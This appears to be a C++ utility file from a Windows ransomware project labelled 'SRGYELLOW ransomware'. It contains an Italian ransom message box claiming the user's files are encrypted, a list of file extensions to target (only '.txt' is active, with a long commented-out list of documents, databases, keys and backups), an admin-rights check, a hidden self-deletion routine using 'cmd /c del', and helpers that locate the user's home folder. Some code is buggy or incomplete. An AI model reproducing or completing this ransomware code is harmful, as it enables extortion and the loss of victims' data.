#include "utility.h"

static const char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

int stringLength = sizeof(alphanum) - 1;

char genRandom()
{
   return alphanum[1+(rand()%sizeof(alphanum)) % stringLength];
}

std::string generatoreRandom(int x)
{
    srand((unsigned int)time(0));
    std::string Str;
    
    for(unsigned int i = 0; i < x; ++i)
    {
        Str += genRandom();
    }

    return Str;
}

std::string RemoveSub(std::string& sInput, const std::string& sub)
{
    std::string::size_type foundpos = sInput.find(sub);
    
    if ( foundpos != std::string::npos )
        sInput.erase(sInput.begin() + foundpos, sInput.begin() + foundpos + sub.length());
    
    return sInput;
}

bool hasEnding (std::string const &fullString, std::string const &ending)
{
    if (fullString.length() >= ending.length())
    {
        return (0 == fullString.compare (fullString.length() - ending.length(), ending.length(), ending));
    }
    else
    {
        return false;
    }
}

bool is_file_exist(const char *fileName)
{
    std::ifstream infile(fileName);
    return infile.good();
}

int DisplayResourceNAMessageBox(std::string path, std::string path2)
{
    int msgboxID = MessageBox(
        NULL,
        ("I FILE DEL TUO COMPUTER SONO STATI CRITTATI\n\nPREMI OK PER PAGARE, SE NON LO FAI ORA PUOI FARLO IN SEGUITO LANCIANDO L'ESEGUIBILE CHE SI TROVA " + path2+ "\n E PREMENDO OK\n").c_str(),
        "SRGYELLOW ransomware",
        MB_ICONWARNING | MB_OKCANCEL | MB_DEFBUTTON2 | MB_SYSTEMMODAL
    );

    switch (msgboxID)
    {
    case IDCANCEL:
        break;
    case IDOK:
        break;
    }
    
    return msgboxID;
}

bool checkExt(std::string ext)
{
   std::string extensions[] = {".txt"};//{".docx",".der", ".pfx", ".key", ".crt", ".csr", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot", ".max", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo", ".cpp", ".pas", ".asm", ".cmd", ".bat", ".vbs", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".java", ".jar", ".class", ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mkv", ".flv", ".wma", ".mid", ".djvu", ".svg", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".tgz", ".tar", ".bak", ".tbk", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf", ".wks", ".rtf", ".csv", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".txt", ".doc"};
   bool temp;
   
   for(int i=0; i<((sizeof(extensions)/(sizeof(extensions[0])))); i++)
   {
        if ((hasEnding(ext, extensions[i]) == true))
        {
            temp = true;
            return temp;
        }
        else
        {
            temp = false;
        }
    }
   return temp;
}

BOOL IsAdmin() 
{
    BOOL fIsRunAsAdmin = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PSID pAdministratorsGroup = NULL;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (!AllocateAndInitializeSid(&NtAuthority, 2,SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) 
    {
        dwError = GetLastError();
    }
    else if (!CheckTokenMembership(NULL, pAdministratorsGroup,&fIsRunAsAdmin)) 
    {
        dwError = GetLastError();
    }
    if (pAdministratorsGroup) 
    {
        FreeSid(pAdministratorsGroup);
        pAdministratorsGroup = NULL;
    }
    if (ERROR_SUCCESS != dwError) 
    {
        throw dwError;
    }
    return fIsRunAsAdmin;
}

void RequestAdminPrivileges() 
{
    BOOL bAlreadyRunningAsAdministrator = FALSE;
    
    try 
    {
        bAlreadyRunningAsAdministrator = IsAdmin();
    }
    catch (...) 
    {

    }
    
    if (!bAlreadyRunningAsAdministrator) 
    {
        char szPath[MAX_PATH];
        
        if (GetModuleFileName(NULL, szPath, MAX_PATH)) 
        {
            SHELLEXECUTEINFO sei = { sizeof(sei) };
            sei.lpVerb = "runas";
            sei.lpFile = szPath;
            sei.hwnd = NULL;
            sei.nShow = SW_NORMAL;
        }
    }
}
 
BOOL SelfDelete()
{
    SHELLEXECUTEINFO sei;
 
    TCHAR szModule [MAX_PATH], szComspec[MAX_PATH], szParams [MAX_PATH];
 
    if((GetModuleFileName(0,szModule,MAX_PATH)!=0) && (GetShortPathName(szModule,szModule,MAX_PATH)!=0) && (GetEnvironmentVariable("COMSPEC",szComspec,MAX_PATH)!=0))
    {
        lstrcpy(szParams,"/c del ");
        lstrcat(szParams, szModule);
        lstrcat(szParams, " > nul");

        sei.cbSize       = sizeof(sei);
        sei.hwnd         = 0;
        sei.lpVerb       = "Open";
        sei.lpFile       = szComspec;
        sei.lpParameters = szParams;
        sei.lpDirectory  = 0;
        sei.nShow        = SW_HIDE;
        sei.fMask        = SEE_MASK_NOCLOSEPROCESS;

        SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
        SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

        if(ShellExecuteEx(&sei))
        {
          SetPriorityClass(sei.hProcess,IDLE_PRIORITY_CLASS);
          SetProcessPriorityBoost(sei.hProcess,TRUE);

          SHChangeNotify(SHCNE_DELETE,SHCNF_PATH,szModule,0);
          return TRUE;
        }
        else
        {
          SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
          SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
        }
    }    
    return FALSE;
}

std::string checkExePath()
{
    TCHAR ExeName[MAX_PATH];
    TCHAR DriveLetter = ExeName[0];
    GetModuleFileName(NULL, ExeName, MAX_PATH);
    std::string exe = ExeName;
    
    return exe;
}

std::string checkUsersPath()
{
    std::string drive = getenv("SystemDrive");
    std::string homePath = getenv("HomePath");
    std::string usersPath = drive+homePath;
    
    return usersPath;
}